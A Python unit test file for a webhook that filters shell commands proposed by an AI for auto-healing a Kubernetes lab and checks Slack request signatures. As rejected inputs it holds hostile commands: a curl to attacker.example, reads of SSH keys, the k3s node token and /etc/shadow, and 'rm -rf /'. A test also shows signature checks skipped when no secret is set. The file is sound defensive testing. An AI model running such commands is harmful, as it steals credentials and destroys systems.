"""Unit tests for scripts/webhook.py — the security-critical parsing and
verification paths of the Claude auto-healing bridge.

Covers:
- parse_commands(): allowlist, blocklist, shell-metacharacter enforcement
- verify_slack(): HMAC signature + timestamp freshness
"""
import hashlib
import hmac
import time

import pytest

import webhook


# ── parse_commands ────────────────────────────────────────────────────────────

class TestParseCommandsAllowlist:
    def test_allows_kubectl(self):
        text = "```bash\nkubectl scale deployment/pylab -n pylab --replicas=1\n```"
        assert webhook.parse_commands(text) == [
            "kubectl scale deployment/pylab -n pylab --replicas=1"
        ]

    def test_allows_sudo_prefix(self):
        text = "```bash\nsudo k3s crictl rmi --prune\n```"
        assert webhook.parse_commands(text) == ["sudo k3s crictl rmi --prune"]

    @pytest.mark.parametrize("cmd", [
        "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent",
        "virsh start k3s-worker-2",
        "docker build -t 192.168.122.218:30500/pylab:latest /home/labadmin/pylab/",
    ])
    def test_allows_other_operators(self, cmd):
        assert webhook.parse_commands(f"```bash\n{cmd}\n```") == [cmd]

    def test_rejects_commands_outside_allowlist(self):
        text = "```bash\ncurl http://attacker.example/$(whoami)\nwget evil.sh\n```"
        assert webhook.parse_commands(text) == []


class TestParseCommandsBlocklist:
    def test_blocks_reading_private_keys(self):
        text = "```bash\nssh labadmin@192.168.122.219 cat ~/.ssh/id_rsa\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_node_token_read(self):
        text = "```bash\nssh labadmin@192.168.122.218 sudo cat /var/lib/rancher/k3s/server/node-token\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_kubectl_get_secret(self):
        text = "```bash\nkubectl get secret -n default\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_cat_of_secret_files(self):
        text = "```bash\nkubectl exec -it pod -- cat /etc/shadow\n```"
        assert webhook.parse_commands(text) == []

    def test_blocks_rm_rf_root(self):
        text = "```bash\nsudo kubectl debug node/x -- rm -rf /\n```"
        assert webhook.parse_commands(text) == []


class TestParseCommandsShellMetacharacters:
    """The system prompt forbids them; the parser must enforce it server-side."""

    @pytest.mark.parametrize("line", [
        "kubectl get pods | grep crash",
        "kubectl get nodes; virsh list --all",
        "kubectl get pods && kubectl get nodes",
        "kubectl get nodes `virsh list`",
        "kubectl get nodes $(virsh list)",
    ])
    def test_blocks_metacharacters(self, line):
        assert webhook.parse_commands(f"```bash\n{line}\n```") == []


class TestParseCommandsFormatting:
    def test_skips_comments_and_blank_lines(self):
        text = (
            "```bash\n"
            "# restart the agent\n"
            "\n"
            "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent\n"
            "```"
        )
        assert webhook.parse_commands(text) == [
            "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent"
        ]

    def test_collects_from_multiple_code_blocks(self):
        text = (
            "Diagnosis text.\n"
            "```bash\nkubectl get nodes\n```\n"
            "More prose.\n"
            "```bash\nkubectl get pods -A\n```"
        )
        assert webhook.parse_commands(text) == ["kubectl get nodes", "kubectl get pods -A"]

    def test_unlabelled_block_still_parsed(self):
        assert webhook.parse_commands("```\nkubectl get nodes\n```") == ["kubectl get nodes"]

    def test_no_code_block_yields_empty(self):
        assert webhook.parse_commands("No commands here, just a diagnosis.") == []


# ── verify_slack ──────────────────────────────────────────────────────────────

SECRET = "test-signing-secret"


def make_headers(body: bytes, secret: str = SECRET, ts: str | None = None):
    ts = ts or str(int(time.time()))
    base = f"v0:{ts}:{body.decode()}"
    sig = "v0=" + hmac.new(secret.encode(), base.encode(), hashlib.sha256).hexdigest()
    return {"X-Slack-Request-Timestamp": ts, "X-Slack-Signature": sig}


class TestVerifySlack:
    def test_valid_signature_passes(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab&text=kubectl%20get%20nodes"
        assert webhook.verify_slack(make_headers(body), body) is True

    def test_wrong_secret_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        assert webhook.verify_slack(make_headers(body, secret="other"), body) is False

    def test_tampered_body_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        headers = make_headers(b"original=body")
        assert webhook.verify_slack(headers, b"tampered=body") is False

    def test_stale_timestamp_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        stale = str(int(time.time()) - 301)
        assert webhook.verify_slack(make_headers(body, ts=stale), body) is False

    def test_older_timestamp_within_window_accepted(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        # 5s inside the 300s replay window — accepted
        edge = str(int(time.time()) - 295)
        assert webhook.verify_slack(make_headers(body, ts=edge), body) is True

    def test_missing_headers_fail(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        assert webhook.verify_slack({}, b"command=%2Flab") is False

    def test_non_numeric_timestamp_fails(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", SECRET)
        body = b"command=%2Flab"
        headers = make_headers(body)
        headers["X-Slack-Request-Timestamp"] = "not-a-number"
        assert webhook.verify_slack(headers, body) is False

    def test_secret_unset_bypasses_verification(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_SIGNING_SECRET", "")
        assert webhook.verify_slack({}, b"anything") is True


# ── approver allowlist wiring ─────────────────────────────────────────────────

class TestSlackApproversConfig:
    def test_empty_env_disables_allowlist(self, monkeypatch):
        monkeypatch.setattr(webhook, "SLACK_APPROVERS", [])
        assert webhook.SLACK_APPROVERS == []

    def test_parsing_comma_separated(self, monkeypatch):
        monkeypatch.setattr(
            webhook, "SLACK_APPROVERS",
            [u.strip() for u in "angel, ops-oncall ,".split(",") if u.strip()],
        )
        assert webhook.SLACK_APPROVERS == ["angel", "ops-oncall"]
